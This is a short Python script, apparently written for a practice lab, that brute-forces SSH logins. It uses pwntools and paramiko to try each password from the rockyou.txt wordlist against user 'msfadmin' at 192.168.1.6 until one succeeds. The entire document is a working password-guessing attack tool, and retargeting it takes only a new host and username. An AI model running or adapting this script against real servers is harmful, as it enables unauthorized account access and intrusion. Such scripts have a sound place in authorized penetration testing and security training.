from pwn import *
import paramiko

host = "192.168.1.6"
username = "msfadmin"
attemps = 0

with open("rockyou.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attemps, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[x] Invalid password!")
		except paramiko.ssh_exception.SSHException:
			print("[x] Invalid password!")
		attemps +=1
